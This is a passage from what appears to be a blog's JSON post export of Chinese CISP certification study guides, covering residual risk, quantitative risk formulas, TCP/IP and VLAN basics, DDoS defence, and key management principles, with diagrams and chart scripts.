B1[\"风险降低\"] B --> B2[\"风险转移\"] B --> B3[\"风险规避\"] C --> C1[\"成本效益平衡\"] C --> C2[\"可接受水平\"] C --> C3[\"持续监控\"] D --> D1[\"管理层批准\"] D --> D2[\"正式接受\"] style A fill:#ffcdd2,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#fff9c4,stroke:#f57f17 style D fill:#c8e6c9,stroke:#2e7d32 残余风险管理原则： 残余风险管理： ├── 1. 识别残余风险 │ ├── 评估风险处置效果 │ ├── 确定剩余风险 │ └── 形成残余风险清单 ├── 2. 评估残余风险 │ ├── 评估风险水平 │ ├── 判断是否可接受 │ └── 考虑成本效益 ├── 3. 报告残余风险 │ ├── 向管理层报告 │ ├── 说明风险性质 │ └── 说明可能后果 ├── 4. 批准残余风险 │ ├── 管理层审批 │ ├── 正式接受 │ └── 承担责任 └── 5. 监控残余风险 ├── 持续监控 ├── 定期评估 └── 及时调整 残余风险的特点： 特点 说明 管理要求 不可完全消除 总会存在一定风险 接受现实 动态变化 随时间和环境变化 持续监控 需要批准 必须获得管理层批准 正式接受 成本效益 基于成本效益分析 平衡投入 可能演变 可能诱发新事件 及时应对 为什么不追求最小残余风险： ⚠️ 常见误区错误观念：追求最小残余风险值 ❌ 问题： 成本可能无限增长 投入产出比不合理 可能影响业务运营 不符合实际需求 ✅ 正确做法： 追求可接受的残余风险水平 基于成本效益分析 平衡安全与业务需求 符合组织风险承受能力 成本效益分析示例： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_6e3324eb6')); var option = { \"title\": { \"text\": \"风险处置成本效益分析（示例数据）\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"风险降低\", \"处置成本\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"初始\", \"方案1\", \"方案2\", \"方案3\", \"方案4\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"金额（万元）\" }, \"series\": [ { \"name\": \"风险降低\", \"type\": \"line\", \"data\": [0, 50, 80, 90, 95], \"itemStyle\": {\"color\": \"#4caf50\"} }, { \"name\": \"处置成本\", \"type\": \"line\", \"data\": [0, 20, 40, 80, 150], \"itemStyle\": {\"color\": \"#f44336\"} } ] }; chart.setOption(option); } })(); 📊 图表说明这是帮助理解的示例数据，非真实数据 从图表可以看出： 方案1-2：成本效益比较好 方案3：成本开始快速上升 方案4：成本远超风险降低效果 最优选择：方案2或方案3 不应追求方案4（最小残余风险） 残余风险决策流程： 残余风险决策： ├── 1. 评估残余风险 │ ├── 风险水平：中等 │ ├── 进一步降低成本：100万元 │ └── 预期风险降低：10万元&#x2F;年 ├── 2. 成本效益分析 │ ├── 投资回收期：10年 │ ├── 成本效益比：1:0.1 │ └── 结论：不划算 ├── 3. 决策 │ ├── 不再进一步降低 │ ├── 接受当前残余风险 │ └── 实施监控措施 └── 4. 批准和监控 ├── 向管理层报告 ├── 获得正式批准 └── 建立监控机制 七、定量风险评估 7.1 定量风险评估方法 定量风险评估使用数值来表示风险，可以更精确地计算风险大小和损失预期。 定量风险评估的关键指标： graph TB A[\"定量风险评估指标\"] B[\"资产价值AV\"] C[\"暴露系数EF\"] D[\"单次损失期望SLE\"] E[\"年度发生率ARO\"] F[\"年度预期损失ALE\"] A --> B A --> C B --> D C --> D D --> E E --> F B --> B1[\"Asset Value资产总价值\"] C --> C1[\"Exposure Factor损失比例\"] D --> D1[\"Single Loss ExpectancySLE = AV × EF\"] E --> E1[\"Annualized Rate of Occurrence每年发生次数\"] F --> F1[\"Annualized Loss ExpectancyALE = SLE × ARO\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#ffebee,stroke:#c62828 5.2 定量风险评估计算公式 核心公式： 💡 定量风险评估公式基本公式： 📊 单次损失期望（SLE） SLE = AV × EF AV（Asset Value）：资产价值 EF（Exposure Factor）：暴露系数（损失比例） SLE（Single Loss Expectancy）：单次损失期望 📈 年度预期损失（ALE） ALE = SLE × ARO SLE：单次损失期望 ARO（Annualized Rate of Occurrence）：年度发生率 ALE（Annualized Loss Expectancy）：年度预期损失 完整公式： ALE = AV × EF × ARO 5.3 实际计算示例 案例：机房火灾风险计算 💡 机房火灾风险计算示例已知条件： 机房总价值（AV）：400万元人民币 暴露系数（EF）：25%（火灾导致25%的资产损失） 年度发生率（ARO）：0.2（平均5年发生一次） 计算步骤： 步骤1：计算单次损失期望（SLE） SLE = AV × EF SLE &#x3D; 400万元 × 25% SLE &#x3D; 400万元 × 0.25 SLE &#x3D; 100万元 **步骤2：计算年度预期损失（ALE）** ALE &#x3D; SLE × ARO ALE &#x3D; 100万元 × 0.2 ALE &#x3D; 20万元 **结论：年度预期损失（ALE）= 20万元人民币** 计算过程图示： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_1d06b4f7a')); var option = { \"title\": { \"text\": \"机房火灾风险计算过程\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"xAxis\": { \"type\": \"category\", \"data\": [\"资产价值(AV)\", \"单次损失(SLE)\", \"年度损失(ALE)\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"金额（万元）\" }, \"series\": [{ \"type\": \"bar\", \"data\": [ {\"value\": 400, \"itemStyle\": {\"color\": \"#2196f3\"}}, {\"value\": 100, \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 20, \"itemStyle\": {\"color\": \"#f44336\"}} ], \"label\": { \"show\": true, \"position\": \"top\", \"formatter\": \"{c}万元\" } }] }; chart.setOption(option); } })(); 5.4 定量风险评估的应用 定量评估的价值： 应用场景 说明 示例 投资决策 计算安全投资回报率 安全措施成本 vs ALE降低 优先级排序 根据ALE确定处理优先级 高ALE风险优先处理 保险决策 确定保险金额 根据ALE购买保险 预算规划 制定安全预算 预算应覆盖主要ALE 效果评估 评估安全措施效果 对比实施前后ALE 安全投资决策示例： 场景：是否部署防火墙系统 当前风险： - 资产价值（AV）：1000万元 - 暴露系数（EF）：30% - 年度发生率（ARO）：0.5 - 当前ALE &#x3D; 1000 × 0.3 × 0.5 &#x3D; 150万元 部署防火墙后： - 暴露系数降低到（EF）：10% - 年度发生率降低到（ARO）：0.1 - 新ALE &#x3D; 1000 × 0.1 × 0.1 &#x3D; 10万元 投资分析： - ALE降低：150 - 10 &#x3D; 140万元&#x2F;年 - 防火墙成本：50万元（一次性）+ 10万元&#x2F;年（维护） - 第一年净收益：140 - 50 - 10 &#x3D; 80万元 - 投资回报期：&lt; 1年 - 结论：值得投资 5.5 定量评估的局限性 定量评估的挑战： ⚠️ 定量评估的局限性数据获取困难： 📊 历史数据不足 🔮 未来预测不确定 💰 资产价值难以量化 📉 暴露系数估算困难 计算复杂性： 🧮 需要大量数据 ⏱️ 耗时较长 💡 需要专业知识 🔄 需要持续更新 结果的不确定性： ⚠️ 基于假设和估算 📈 可能存在偏差 🎯 不能完全准确 🔄 需要定期校准 定性与定量评估对比： 特征 定性评估 定量评估 数据要求 低 高 精确度 低 高 成本 低 高 时间 短 长 专业要求 中 高 结果表达 高/中/低 具体数值 适用场景 快速评估、初步评估 投资决策、详细分析 主观性 高 低 最佳实践：结合使用 综合风险评估方法： ├── 第一阶段：定性评估 │ ├── 快速识别主要风险 │ ├── 确定评估范围 │ ├── 初步优先级排序 │ └── 决定是否需要定量评估 ├── 第二阶段：定量评估（针对高风险） │ ├── 收集详细数据 │ ├── 计算ALE │ ├── 投资决策分析 │ └── 制定详细计划 └── 第三阶段：持续监控 ├── 跟踪实际损失 ├── 更新评估参数 ├── 调整安全措施 └── 重新评估 八、风险监控 8.1 风险监控的目的 风险监控的关键活动： 📊 监控风险状态变化 🔍 评估处置措施有效性 🆕 识别新的风险 🔄 更新风险评估 📋 报告风险状况 8.2 持续改进 风险管理的持续改进循环： graph LR A[\"计划Plan\"] --> B[\"执行Do\"] B --> C[\"检查Check\"] C --> D[\"改进Act\"] D --> A style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 九、总结 信息安全风险管理的核心要点： 背景建立：风险管理的第一步，调查系统、分析环境 风险评估：识别资产、威胁、脆弱性并进行评估 风险处置：选择合适的策略降低风险 风险监控：持续监控和改进 🎯 关键要点 背景建立是风险管理的第一步 背景建立的依据包括政策法规、机构使命和系统特性 背景建立阶段调查系统、分析环境，形成描述报告和需求报告 资产、威胁、脆弱性的识别和赋值属于风险评估阶段 风险处置有四种策略：规避、缓解、转移、接受 风险管理是一个持续的过程 💡 实践建议 建立系统化的风险管理流程 定期进行风险评估 根据风险等级制定处置计划 持续监控风险状态 建立风险管理文档体系 培养全员风险意识","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：网络基础知识","slug":"2025/10/CISP-Network-Fundamentals-zh-CN","date":"un22fin22","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Network-Fundamentals/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Network-Fundamentals/","excerpt":"深入解析CISP认证中的网络基础知识，涵盖TCP/IP协议、威胁分类和私有IP地址等核心概念。","text":"网络基础知识是信息安全的重要基础，本文详细介绍TCP/IP协议、威胁分类和IP地址管理等核心概念。 一、TCP/IP协议体系 1.1 TCP/IP协议概述 TCP/IP协议是Internet的基础协议，也是Internet构成的基础。TCP/IP通常被认为是一个四层协议，每一层都使用它的下一层所提供的网络服务来完成自己的功能。 graph TB A[\"TCP/IP四层模型\"] B[\"应用层Application Layer\"] C[\"传输层Transport Layer\"] D[\"网络层Internet Layer\"] E[\"网络接口层Network Access Layer\"] A --> B B --> C C --> D D --> E B --> B1[\"HTTP, FTP, SMTPDNS, Telnet\"] C --> C1[\"TCP, UDP\"] D --> D1[\"IP, ICMP, ARP\"] E --> E1[\"以太网, Wi-Fi物理传输\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 💡 TCP/IP是四层协议四层结构： 应用层：提供应用程序接口 传输层：提供端到端通信 网络层：提供路由和寻址 网络接口层：提供物理传输 与OSI七层模型的对应： TCP/IP应用层 = OSI应用层 + 表示层 + 会话层 TCP/IP传输层 = OSI传输层 TCP/IP网络层 = OSI网络层 TCP/IP网络接口层 = OSI数据链路层 + 物理层 1.2 TCP/IP各层功能详解 各层功能对比： 层次 名称 主要功能 典型协议 数据单位 第4层 应用层 为应用程序提供网络服务 HTTP, FTP, SMTP, DNS 消息/数据 第3层 传输层 提供端到端的可靠传输 TCP, UDP 段(Segment) 第2层 网络层 路由选择和逻辑寻址 IP, ICMP, ARP 包(Packet) 第1层 网络接口层 物理寻址和数据传输 以太网, Wi-Fi 帧(Frame) 1.3 TCP/IP与OSI模型对比 graph LR subgraph OSI[\"OSI七层模型\"] O7[\"应用层\"] O6[\"表示层\"] O5[\"会话层\"] O4[\"传输层\"] O3[\"网络层\"] O2[\"数据链路层\"] O1[\"物理层\"] end subgraph TCP[\"TCP/IP四层模型\"] T4[\"应用层\"] T3[\"传输层\"] T2[\"网络层\"] T1[\"网络接口层\"] end O7 --> T4 O6 --> T4 O5 --> T4 O4 --> T3 O3 --> T2 O2 --> T1 O1 --> T1 style T4 fill:#e3f2fd,stroke:#1976d2 style T3 fill:#e8f5e9,stroke:#388e3d style T2 fill:#fff3e0,stroke:#f57c00 style T1 fill:#f3e5f5,stroke:#7b1fa2 主要区别： 特征 OSI模型 TCP/IP模型 层数 7层 4层 性质 理论模型 实际应用 开发时间 1970年代后期 1970年代早期 应用范围 教学和理论研究 Internet实际应用 灵活性 较严格 较灵活 二、信息安全威胁分类 2.1 威胁能力层面分类 信息系统面临外部攻击者的恶意攻击威胁，从威胁能力和掌握资源分，这些威胁可以按照个人威胁、组织威胁和国家威胁三个层面划分。 graph TB A[\"威胁分类\"] B[\"个人威胁Individual Threat\"] C[\"组织威胁Organizational Threat\"] D[\"国家威胁Nation-State Threat\"] A --> B A --> C A --> D B --> B1[\"娱乐型黑客\"] B --> B2[\"个人恶作剧\"] B --> B3[\"自我挑战\"] C --> C1[\"犯罪团伙\"] C --> C2[\"经济利益\"] C --> C3[\"有组织犯罪\"] D --> D1[\"情报机构\"] D --> D2[\"信息作战部队\"] D --> D3[\"国家级资源\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffcdd2,stroke:#c62828 2.2 三个威胁层面详解 威胁层面对比： 威胁层面 典型攻击者 动机 能力 资源 个人威胁 娱乐型黑客、脚本小子 恶作剧、自我挑战、炫耀 较低 有限 组织威胁 犯罪团伙、黑客组织 经济利益、政治目的 中等到高 较多 国家威胁 情报机构、信息作战部队 情报收集、战略优势 非常高 国家级 💡 威胁层面特征个人威胁： 动机：娱乐、挑战、炫耀 能力：相对有限 影响：通常较小 例子：脚本小子、业余黑客 组织威胁： 动机：经济利益、政治目的 能力：专业化、组织化 影响：可能造成重大损失 例子：勒索软件团伙、APT组织 国家威胁： 动机：国家安全、战略优势 能力：最高级别 影响：可能影响国家安全 例子：国家情报机构、网络战部队 2.3 威胁应对策略 针对不同威胁层面的防护策略： graph TB A[\"威胁应对策略\"] B[\"个人威胁防护\"] C[\"组织威胁防护\"] D[\"国家威胁防护\"] A --> B A --> C A --> D B --> B1[\"基础安全措施\"] B --> B2[\"安全意识培训\"] B --> B3[\"常规监控\"] C --> C1[\"深度防御\"] C --> C2[\"威胁情报\"] C --> C3[\"专业团队\"] D --> D1[\"国家级防护\"] D --> D2[\"战略防御\"] D --> D3[\"多层隔离\"] style B fill:#e8f5e9,stroke:#388e3d style C fill:#fff3e0,stroke:#f57c00 style D fill:#ffcdd2,stroke:#c62828 三、IP地址管理 3.1 私有IP地址概述 私有IP地址是一段保留的IP地址，只使用在局域网中，无法在Internet上使用。私有地址在A类、B类和C类地址中都有定义。 graph TB A[\"IP地址分类\"] B[\"公有IP地址\"] C[\"私有IP地址\"] A --> B A --> C B --> B1[\"可在Internet使用\"] B --> B2[\"全球唯一\"] B --> B3[\"需要申请\"] C --> C1[\"仅局域网使用\"] C --> C2[\"可重复使用\"] C --> C3[\"无需申请\"] C --> D[\"A类私有地址\"] C --> E[\"B类私有地址\"] C --> F[\"C类私有地址\"] D --> D1[\"10.0.0.0/8\"] E --> E1[\"172.16.0.0/12\"] F --> F1[\"192.168.0.0/16\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#fff3e0,stroke:#f57c00 style F fill:#fff3e0,stroke:#f57c00 3.2 私有IP地址范围 三类私有IP地址详解： 类别 地址范围 CIDR表示 地址数量 典型用途 A类 10.0.0.0 - 10.255.255.255 10.0.0.0/8 16,777,216 大型企业网络 B类 172.16.0.0 - 172.31.255.255 172.16.0.0/12 1,048,576 中型企业网络 C类 192.168.0.0 - 192.168.255.255 192.168.0.0/16 65,536 家庭和小型网络 💡 私有IP地址特点使用范围： 只能在局域网内使用 不能直接在Internet上路由 需要通过NAT访问Internet 优势： 节省公有IP地址资源 提高网络安全性 灵活配置内部网络 三类地址都有私有范围： A类：10.0.0.0/8 B类：172.16.0.0/12 C类：192.168.0.0/16 3.3 NAT（网络地址转换） 私有IP地址需要通过NAT（Network Address Translation）才能访问Internet。 graph LR A[\"内网设备192.168.1.10\"] B[\"NAT路由器私有IP: 192.168.1.1公有IP: 203.0.113.5\"] C[\"Internet\"] D[\"目标服务器93.184.216.34\"] A -->|\"源: 192.168.1.10目标: 93.184.216.34\"| B B -->|\"源: 203.0.113.5目标: 93.184.216.34\"| C C --> D style A fill:#e8f5e9,stroke:#388e3d style B fill:#fff3e0,stroke:#f57c00 style C fill:#e3f2fd,stroke:#1976d2 style D fill:#f3e5f5,stroke:#7b1fa2 NAT的工作原理： 内网到外网： 内网设备使用私有IP发送数据包 NAT路由器将源IP替换为公有IP 记录映射关系（端口映射表） 转发到Internet 外网到内网： 接收来自Internet的响应数据包 查找端口映射表 将目标IP替换为私有IP 转发给内网设备 3.4 IP地址分类回顾 传统IP地址分类： 类别 第一字节范围 默认子网掩码 网络数 主机数 用途 A类 1-126 255.0.0.0 126 16,777,214 大型网络 B类 128-191 255.255.0.0 16,384 65,534 中型网络 C类 192-223 255.255.255.0 2,097,152 254 小型网络 D类 224-239 - - - 组播 E类 240-255 - - - 保留 ⚠️ 特殊IP地址保留地址： 127.0.0.0/8：本地回环地址 0.0.0.0：默认路由 255.255.255.255：广播地址 私有地址： 10.0.0.0/8（A类） 172.16.0.0/12（B类） 192.168.0.0/16（C类） 四、VLAN技术 4.1 VLAN概述 虚拟局域网（VLAN，Virtual Local Area Network）是一种将局域网设备从逻辑上划分成一个个网段，从而实现虚拟工作组的技术。 🌐 VLAN的核心作用VLAN可以将广播流限制在固定区域内，降低网络的带宽消耗，提高网络性能和安全性。 4.2 广播风暴问题 ARP广播问题场景： graph TB A[\"计算机A发送ARP请求\"] B[\"交换机1收到请求\"] C[\"转发到所有其他端口\"] D[\"交换机2、3、4、5\"] E[\"所有客户端收到请求\"] F[\"网络带宽消耗\"] A --> B B --> C C --> D D --> E E --> F style F fill:#ffcdd2,stroke:#c62828 问题描述： 在基于以太网的通信中： 计算机A需要与计算机B通信 A必须先广播&quot;ARP请求信息&quot;获取B的物理地址 交换机收到ARP请求后，会转发给接收端口以外的所有端口 ARP请求会被发到网络中的所有客户上 月底用户量大时，网络服务速度极其缓慢 广播风暴的影响： 影响方面 具体表现 严重程度 带宽消耗 大量广播占用带宽 🔴 高 网络性能 响应速度变慢 🔴 高 设备负载 交换机处理压力大 🟡 中 用户体验 服务缓慢甚至中断 🔴 高 4.3 VLAN解决方案 ✅ 最佳解决方案：VLAN划分为降低网络的带宽消耗，将广播流限制在固定区域内，可以采用VLAN划分技术。 VLAN工作原理： graph TB A[\"物理网络\"] B[\"VLAN 10销售部门\"] C[\"VLAN 20技术部门\"] D[\"VLAN 30财务部门\"] A --> B A --> C A --> D B --> B1[\"广播域1\"] C --> C1[\"广播域2\"] D --> D1[\"广播域3\"] B1 -.\"隔离\".-> C1 C1 -.\"隔离\".-> D1 style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 VLAN的优势： 限制广播域 📡 广播只在同一VLAN内传播 🚫 不会跨VLAN传播 💾 大幅降低带宽消耗 提高安全性 🔒 逻辑隔离不同部门 🛡️ 防止未授权访问 🔐 增强数据保护 灵活管理 🔄 逻辑划分，不受物理位置限制 ⚙️ 易于调整和管理 📊 简化网络架构 提升性能 ⚡ 减少不必要的流量 🎯 优化网络资源利用 📈 提高整体性能 4.4 其他方案对比 各种解决方案对比： 方案 能否解决广播问题 实施难度 成本 推荐度 VLAN划分 ✅ 是 🟢 低 💰 低 ⭐⭐⭐⭐⭐ 动态分配地址 ❌ 否 🟢 低 💰 低 ⭐ 修改默认令牌 ❌ 否 🟡 中 💰 低 ⭐ 入侵防御系统 ❌ 否 🔴 高 💰💰💰 高 ⭐ 方案分析： A. VLAN划分（正确答案） ✅ 直接解决广播域过大的问题 ✅ 将广播限制在固定区域 ✅ 实施简单，成本低 ✅ 是标准的网络优化方案 B. 动态分配地址（DHCP） ❌ 不能限制广播域 ❌ 只是自动分配IP地址 ❌ 不解决ARP广播问题 C. 修改默认令牌 ❌ 与广播域大小无关 ❌ 主要用于安全加固 ❌ 不能减少广播流量 D. 入侵防御系统（IPS） ❌ 用于检测和防御攻击 ❌ 不能限制正常的广播流量 ❌ 成本高，不适合此场景 4.5 VLAN实施要点 VLAN划分策略： VLAN划分示例（银行网络）： ├── VLAN 10：柜台交易系统 ├── VLAN 20：ATM网络 ├── VLAN 30：办公网络 ├── VLAN 40：服务器网络 └── VLAN 99：管理网络 广播域隔离： - 每个VLAN是独立的广播域 - ARP请求只在本VLAN内广播 - 跨VLAN通信需要通过路由器 实施步骤： 规划VLAN 根据业务部门划分 根据安全级别划分 考虑未来扩展 配置交换机 创建VLAN 分配端口到VLAN 配置Trunk端口 测试验证 验证VLAN隔离 测试跨VLAN通信 监控网络性能 文档记录 VLAN分配表 端口映射表 配置备份 VLAN配置示例： # 创建VLAN vlan 10 name Sales vlan 20 name Technical vlan 30 name Finance # 分配端口到VLAN interface range fa0&#x2F;1-10 switchport mode access switchport access vlan 10 interface range fa0&#x2F;11-20 switchport mode access switchport access vlan 20 五、DDoS攻击与可用性 5.1 DDoS攻击概述 DDoS（Distributed Denial of Service）分布式拒绝服务攻击是针对网络和系统可用性的典型攻击方式。 💡 DDoS与CIA三要素DDoS攻击主要破坏系统的可用性（Availability）。关于CIA三要素的详细说明，请参考：CISP学习指南：信息安全CIA三要素 2016年10月21日美国东部断网事件： 目标：DNS服务商Dyn 影响：Twitter、Netflix、Reddit等主要网站 攻击方式：利用IoT设备组成僵尸网络 破坏目标：系统的可用性 5.2 DDoS攻击类型 常见DDoS攻击类型： 攻击类型 攻击层次 攻击方式 影响 流量型攻击 网络层 UDP Flood, ICMP Flood 带宽耗尽 协议型攻击 传输层 SYN Flood, ACK Flood 连接资源耗尽 应用层攻击 应用层 HTTP Flood, DNS Query Flood 应用资源耗尽 5.3 DDoS防护措施 DDoS防护策略： DDoS防护体系： ├── 预防措施 │ ├── 网络架构优化 │ ├── 带宽冗余 │ ├── 负载均衡 │ └── CDN加速 ├── 检测措施 │ ├── 流量监控 │ ├── 异常检测 │ ├── 行为分析 │ └── 实时告警 ├── 响应措施 │ ├── 流量清洗 │ ├── IP黑名单 │ ├── 限流限速 │ └── 应急切换 └── 恢复措施 ├── 服务恢复 ├── 日志分析 ├── 溯源调查 └── 加固改进 六、总结 网络基础知识的核心要点： TCP/IP协议：四层协议模型，是Internet的基础 威胁分类：个人威胁、组织威胁、国家威胁 私有IP地址：A、B、C类都有私有地址范围 NAT技术：实现私有IP访问Internet VLAN技术：限制广播域，提高网络性能和安全性 DDoS攻击：破坏系统可用性的典型网络攻击 🎯 关键要点 TCP/IP是四层协议，不是七层（OSI是七层） 犯罪团伙属于组织威胁，以经济利益为目的 A类、B类和C类地址中都有私有地址 私有地址只能在局域网使用，需要NAT访问Internet 理解不同威胁层面的特征和应对策略 💡 实践建议 正确规划内网IP地址 合理使用私有IP地址 配置NAT实现Internet访问 根据威胁层面制定防护策略 建立分层防御体系 部署DDoS防护措施 定期评估网络安全状况","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：密码学与安全","slug":"2025/10/CISP-Cryptography-Security-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Cryptography-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Cryptography-Security/","excerpt":"深入解析CISP认证中的密码学知识点，涵盖密码系统组成、密钥安全性和攻击面降低原则。","text":"密码学是信息安全的核心技术之一，通过加密技术保护数据的机密性、完整性和可用性。 一、密码系统基础 1.1 密码系统的组成 一个密码系统至少由5个部分组成。 密码系统的五个组成部分： graph TB A[\"密码系统\"] B[\"明文Plaintext\"] C[\"密文Ciphertext\"] D[\"加密算法Encryption\"] E[\"解密算法Decryption\"] F[\"密钥Key\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"原始数据\"] C --> C1[\"加密后数据\"] D --> D1[\"加密过程\"] E --> E1[\"解密过程\"] F --> F1[\"安全性核心\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#ffcdd2,stroke:#c62828 加密和解密过程： 加密过程： 明文 + 加密算法 + 密钥 → 密文 解密过程： 密文 + 解密算法 + 密钥 → 明文 1.2 密码系统的安全性 密码系统的安全性由密钥决定。 💡 为什么密钥决定安全性Kerckhoffs原则（柯克霍夫原则）： 🔐 核心思想 密码系统的安全性应该依赖于密钥的保密性 而不是依赖于算法的保密性 即使算法公开，只要密钥保密，系统就是安全的 📜 原则内容 &quot;系统的安全性不应依赖于对算法的保密&quot; &quot;算法可以公开，但密钥必须保密&quot; &quot;即使敌人知道算法，只要不知道密钥，就无法破解&quot; ✅ 实践意义 现代密码算法（如AES、RSA）都是公开的 安全性完全依赖于密钥的保密性和长度 密钥管理是密码系统最关键的环节 为什么不是算法决定安全性： graph TB A[\"密码系统安全性\"] B[\"❌ 错误观念\"] C[\"✅ 正确理解\"] A --> B A --> C B --> B1[\"依赖算法保密\"] B --> B2[\"隐藏算法细节\"] B --> B3[\"自创加密算法\"] C --> C1[\"依赖密钥保密\"] C --> C2[\"使用公开算法\"] C --> C3[\"强密钥管理\"] B1 --> B1A[\"算法可能泄露\"] B2 --> B2A[\"无法经过验证\"] B3 --> B3A[\"可能存在缺陷\"] C1 --> C1A[\"密钥易于更换\"] C2 --> C2A[\"经过广泛验证\"] C3 --> C3A[\"安全性可控\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 选项分析： 选项 说明 为什么不正确 A. 加密算法 算法可以公开 算法公开不影响安全性 B. 解密算法 算法可以公开 算法公开不影响安全性 C. 加密和解密算法 算法可以公开 算法公开不影响安全性 D. 密钥 ✅ 正确答案 密钥的保密性决定安全性 💡 密钥安全性的重要性密钥是密码系统的核心： 🔑 密钥的作用 控制加密和解密过程 决定密文的唯一性 保证通信双方的身份 🛡️ 密钥安全要求 密钥长度足够（如AES-256） 密钥随机生成 密钥安全存储 密钥定期更换 密钥安全分发 ⚠️ 密钥泄露后果 所有加密数据可被解密 通信安全完全失效 需要立即更换密钥 可能需要重新加密所有数据 1.3 密钥管理 密钥生命周期管理： graph LR A[\"密钥生成\"] --> B[\"密钥分发\"] B --> C[\"密钥存储\"] C --> D[\"密钥使用\"] D --> E[\"密钥更新\"] E --> F[\"密钥销毁\"] A --> A1[\"随机生成\"] B --> B1[\"安全传输\"] C --> C1[\"加密保护\"] D --> D1[\"访问控制\"] E --> E1[\"定期更换\"] F --> F1[\"安全删除\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#ffebee,stroke:#c62828 密钥管理最佳实践： 密钥管理要点： ├── 生成阶段 │ ├── 使用密码学安全的随机数生成器 │ ├── 确保密钥长度符合安全标准 │ └── 避免使用弱密钥或可预测密钥 ├── 分发阶段 │ ├── 使用安全通道传输密钥 │ ├── 采用密钥交换协议（如Diffie-Hellman） │ └── 验证接收方身份 ├── 存储阶段 │ ├── 加密存储密钥 │ ├── 使用硬件安全模块（HSM） │ └── 实施访问控制 ├── 使用阶段 │ ├── 最小权限原则 │ ├── 审计密钥使用 │ └── 防止密钥泄露 ├── 更新阶段 │ ├── 定期更换密钥 │ ├── 密钥轮换策略 │ └── 保留旧密钥用于解密历史数据 └── 销毁阶段 ├── 安全删除密钥 ├── 覆写存储介质 └── 记录销毁过程 二、攻击面降低原则 2.1 攻击面概念 攻击面是指系统中可能被攻击者利用的所有入口点和暴露点。 攻击面的组成： graph TB A[\"攻击面\"] B[\"网络攻击面\"] C[\"软件攻击面\"] D[\"物理攻击面\"] E[\"人员攻击面\"] A --> B A --> C A --> D A --> E B --> B1[\"开放端口\"] B --> B2[\"网络服务\"] B --> B3[\"网络协议\"] C --> C1[\"应用程序\"] C --> C2[\"操作系统\"] C --> C3[\"第三方组件\"] D --> D1[\"物理访问\"] D --> D2[\"设备接口\"] D --> D3[\"存储介质\"] E --> E1[\"社会工程\"] E --> E2[\"内部威胁\"] E --> E3[\"权限滥用\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 2.2 日志共享安全问题案例 案例背景： 某集团公司在各地分支机构部署前置机，总部要求前置机开放日志共享，由总部服务器采集进行集中分析。但发现攻击者也可通过共享从前置机中提取日志，导致部分敏感信息泄漏。 问题分析： graph TB A[\"日志共享安全问题\"] B[\"❌ 错误方案\"] C[\"✅ 正确方案\"] A --> B A --> C B --> B1[\"直接关闭日志共享\"] B --> B2[\"接受此风险\"] B --> B3[\"取消日志记录\"] C --> C1[\"限制访问IP\"] C --> C2[\"设置访问控制\"] C --> C3[\"限定访问时间\"] B1 --> B1A[\"影响安全分析\"] B2 --> B2A[\"风险未缓解\"] B3 --> B3A[\"失去审计能力\"] C1 --> C1A[\"只允许总部IP\"] C2 --> C2A[\"身份认证授权\"] C3 --> C3A[\"减少暴露时间\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 💡 正确的处理措施答案：只允许特定的IP地址从前置机提取日志，对日志共享设置访问控制且限定访问的时间 🎯 降低攻击面的原则 不是完全关闭功能，而是限制访问 保留必要功能，同时增强安全控制 平衡安全性和可用性 ✅ 具体措施 IP白名单：只允许总部服务器IP访问 访问控制：实施身份认证和授权 时间限制：仅在需要时开放访问 加密传输：使用加密协议传输日志 审计监控：记录所有访问行为 错误方案分析： 方案 